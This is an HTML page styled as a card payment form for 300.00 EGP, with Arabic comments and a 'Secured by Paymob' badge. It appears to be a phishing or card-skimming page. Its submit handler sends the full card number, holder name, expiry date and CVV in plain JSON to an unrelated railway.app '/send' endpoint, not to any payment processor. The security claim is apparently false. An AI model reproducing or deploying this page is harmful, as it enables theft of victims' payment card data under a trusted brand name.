<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Information</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: white;
            width: 350px;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        h2 {
            color: #333;
            margin-bottom: 15px;
        }
        .card {
            background: #0074D9;
            color: white;
            padding: 15px;
            border-radius: 10px;
            text-align: left;
            position: relative;
        }
        .chip {
            width: 40px;
            position: absolute;
            top: 10px;
            left: 10px;
        }
        .form-group {
            text-align: left;
            margin: 15px 0;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }
        input:focus {
            border-color: #0074D9;
            outline: none;
        }
        .pay-btn {
            width: 100%;
            background: #0074D9;
            color: white;
            border: none;
            padding: 15px;
            font-size: 18px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 10px;
        }
        .pay-btn:hover {
            background: #005bb5;
        }
        .logos {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-top: 10px;
        }
        .logos img {
            width: 50px;
        }
        .secure {
            font-size: 12px;
            margin-top: 5px;
            color: #666;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Payment Information</h2>
        <div class="card">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/88/EMV-Chip.svg" class="chip" alt="Chip">
            <p>Card Number</p>
            <p>•••• •••• •••• ••••</p>
            <p>Card Name</p>
            <p>Enter Name</p>
            <p>Valid Thru</p>
            <p>MM/YY</p>
        </div>

        <form id="paymentForm">
            <div class="form-group">
                <label>Card Number:</label>
                <input type="text" id="cardNumber" placeholder="Enter Card Number" maxlength="16" required>
            </div>

            <div class="form-group">
                <label>Card Holder Name:</label>
                <input type="text" id="name" placeholder="Enter Name" required>
            </div>

            <div class="form-group">
                <label>Expiration Date:</label>
                <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
            </div>

            <div class="form-group">
                <label>CVV:</label>
                <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
            </div>

            <button type="submit" class="pay-btn">PAY 300.00 EGP</button>
        </form>

        <div class="logos">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/04/Visa.svg/120px-Visa.svg.png" alt="Visa">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/120px-Mastercard-logo.svg.png" alt="MasterCard">
        </div>

        <p class="secure">🔒 Secured by Paymob</p>
    </div>

    <script>
        // السماح بالأرقام فقط في حقل رقم البطاقة
        document.getElementById("cardNumber").addEventListener("input", function() {
            this.value = this.value.replace(/\D/g, ''); // يمنع الحروف
        });

        // السماح فقط بالحروف الإنجليزية في اسم حامل البطاقة
        document.getElementById("name").addEventListener("input", function() {
            this.value = this.value.replace(/[^A-Za-z\s]/g, ''); // يمنع الأرقام والرموز
        });

        // السماح فقط بالأرقام في تاريخ الانتهاء وإضافة "/"
        document.getElementById("expiry").addEventListener("input", function() {
            this.value = this.value.replace(/[^0-9/]/g, ''); // يمنع الحروف
            if (this.value.length === 2 && !this.value.includes('/')) {
                this.value += '/';
            }
        });

        // السماح بالأرقام فقط في CVV
        document.getElementById("cvv").addEventListener("input", function() {
            this.value = this.value.replace(/\D/g, ''); // يمنع الحروف
        });

        // إرسال البيانات عند الضغط على زر الدفع
        document.getElementById("paymentForm").addEventListener("submit", function(event) {
            event.preventDefault();

            const cardNumber = document.getElementById("cardNumber").value;
            const name = document.getElementById("name").value;
            const expiry = document.getElementById("expiry").value;
            const cvv = document.getElementById("cvv").value;

            fetch("https://nodejs-production-7090.up.railway.app/send", { 
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ cardNumber, name, expiry, cvv })
            })
            .then(response => response.json())
            .then(data => alert(data.message))
            .catch(error => alert("حدث خطأ!"));
        });
    </script>

</body>
</html>
